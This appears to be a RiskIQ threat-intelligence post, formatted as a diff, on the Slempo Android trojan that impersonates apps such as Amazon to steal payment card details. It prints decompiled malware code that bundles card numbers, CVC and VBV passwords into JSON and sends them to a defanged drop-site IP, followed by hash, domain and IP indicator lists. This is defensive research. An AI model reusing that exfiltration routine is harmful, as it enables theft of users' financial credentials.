@@ -1,0 +1,116 @@
+A Brief Encounter with Slempo
+Given the success of previous scareware tactics, mobile devices became the next logical step in the evolution of this threat. Over the past two years, there have been various reports regarding an increase in mobile activity that employs rogue pop-ups that harvest user information. The same panic and impulse decision-making off which perpetrators of traditional scareware feed—along with the rapid adoption of mobile devices—helped create the perfect environment for it to thrive in the mobile space. But due to the way RiskIQ’s platform works, we have a unique perspective of not only how these attacks originate, but also how they are evolving and shaping user experiences. From our unique vantage point, RiskIQ has been observing this evolution and mapping out how these nefarious campaigns threaten the integrity of many mobile user experiences.
+Conceptually, this activity aligns with scams that were deployed in the past. But notable reports from Malwarebytes, the Polish CERT, and FireEye [1] [2] bring specific campaigns to light that help illustrate how these mobile trojans have evolved, specifically in their ability to collect financial information and valuable credentials. These upgraded trojans also communicate with attacker-controlled infrastructure, known as a command and control servers, in order to receive instructions on where to unload the stolen information. This specified drop site is where the stolen information is warehoused and distributed throughout the criminal ecosystem.
+These applications have been compromising Android devices by gaining a range of permissions that include the unauthorized use of text messages and data transmissions and sometimes controlling the user experience by performing the application overlay technique. As described by some researchers, this technique searches for applications that, for example, require a mobile user to authenticate or provide credit card details. Upon detection, the mobile trojan will generate a rogue overlay, impersonating the other application and stealing the user provided information for illicit sale or reuse.
+Now let’s take a minute and dive into some of the data within our platform. A quick search for the package name org.slempo.service within our mobile application repository reveals 22 Android apps. These packages appear to be impersonating commonly used applications such as:
+One of the example mobile packages that is attempting to impersonate an Amazon app is shown in the following screenshot from our mobile repository:
+
+The mobile application’s metadata reveals some interesting URLs that the application communicates with and the permissions seem a bit excessive. So let’s install it to verify the permissions. The following screenshots were taken to illustrate what a user sees during the application install:
+
+
+Now that looks suspicious. The application needs the ability to potentially perform a factory reset, directly call phone numbers, and send and receive SMS messages. Additionally, it would like the ability to draw over other apps and apparently this is Amazon’s first major release (version 1.0).
+But what about those URLs in the metadata? A quick look at the source code of the application shows instructions to send card data to an IP address used as the drop site which is located in AS50113 (Russia):
+public String getLink(){
+return “hxxp://185.40.4[.]99:2080/forms/”;
+}
+…redacted for brevity…
+if (!localIterator.hasNext()){
+Sender.sendCardData(this, “hxxp://185.40.4[.]99:2080/”, localCard, localJSONObject, new AdditionalInformation(this.vbvPass.getText().toString(), this.oldVbvPass));
+return;
+}
+…redacted for brevity…
+public static void sendCardData(Context paramContext, String paramString, Card paramCard, JSONObject paramJSONObject, AdditionalInformation paramAdditionalInformation){
+try
+{
+JSONObject localJSONObject1 = new JSONObject();
+localJSONObject1.put(“type”, “card information”);
+JSONObject localJSONObject2 = new JSONObject();
+localJSONObject2.put(“number”, paramCard.getNumber());
+localJSONObject2.put(“month”, paramCard.getMonth());
+localJSONObject2.put(“year”, paramCard.getYear());
+localJSONObject2.put(“cvc”, paramCard.getCvc());
+localJSONObject1.put(“card”, localJSONObject2);
+localJSONObject1.put(“billing address”, paramJSONObject);
+JSONObject localJSONObject3 = new JSONObject();
+localJSONObject3.put(“vbv password”, paramAdditionalInformation.getVbvPass());
+localJSONObject3.put(“old vbv password”, paramAdditionalInformation.getOldVbvPass());
+localJSONObject1.put(“additional information”, localJSONObject3);
+sendUserData(paramContext, localJSONObject1);
+return;
+}
+The following MD5 hashes have been observed by our platform and are stored within our mobile application repository:
+d300f6e167055594005c5dd9e9239e68
+b4a1b3555fca501d6031bfda7a659b0a
+e3ea0d652b5e153a0c64b5e1229f1000
+b894dfae302b77a069c0b87e76f385ac
+3176508a22af43b188fd4f7082b90e80
+9cd290b73ad9f2b9957c7cf34673a40f
+db9f046c8a056d7d3b89590b0d11f551
+4b9678097f6f2c35f7d63368b169ceb7
+b41ddea96efaf73275a2f0e986574c7d
+b77fae695e54e48d85b9f6d92ec71405
+2f32374846c5be06f48c59accf36a15b
+6a07896567e6eb88cf99b600e91b92b8
+9d0fc6ae9e3f22d9777374b1a676a986
+863d455cfc3e1c89e0a34bd1323c3aec
+0bbf01589cfda94828b665a013b31fe3
+19970df638b5b81c9a1f1dac4b8ac676
+b526cb3a500bd63f12c836303e21bb86
+3a5b330e520c45d8a1ebf1f43042f0e0
+288ad03cc9788c0855d446e34c7284ea
+68254a72a805dceed70e1da6f84041e4
+718d4452bcda0c517bca8b523637d451
+1599093a330ff478b0baeee903ad4dc6
+The above applications are primarily delivered through drive-by download attacks. Below is an example that was submitted to our platform by a customer scanning their ads for malware. This incident occurred on January 26th and helps illustrate the chain of events that might occur within an ad sequence:
+
+The package in the screenshot titled ‘Update.apk’ is the actual Android application being downloaded. Additionally, the following associated domains and IP addresses were observed in relation to the above campaign:
+Domains:
+man5hats.ru
+rghost.ru
+xxxvideotube.org
+adobe-flash-player-11.com
+jackdojacksgot.ru
+alexhost.md
+xxxmobiletubez.com
+brutaltube4mobile.com
+gexmails.com
+adobeupdate.org
+brutalmobiletubes.com
+updateflashplayeer.com
+australiamms.com
+IP Addresses:
+176.123.28.128
+179.60.147.21
+181.174.164.25
+185.86.148.188
+195.3.144.90
+216.58.192.14
+216.58.192.46
+37.1.196.207
+37.1.205.155
+37.1.205.200
+46.101.28.84
+5.196.121.148
+74.125.224.2
+74.125.239.102
+74.125.239.104
+74.125.239.110
+74.125.239.128
+74.125.239.132
+74.125.239.134
+74.125.239.136
+74.125.239.32
+74.125.239.36
+74.125.239.37
+74.125.239.38
+74.125.239.39
+74.125.239.40
+74.125.239.41
+74.125.239.46
+74.125.239.98
+94.102.53.184
+95.211.198.23
+216.58.192.46
+185.40.4.99
+185.40.4.99
+With this new tactic in mind, RiskIQ actively encourages our customers and other mobile users to only download applications from trusted mobile app stores.
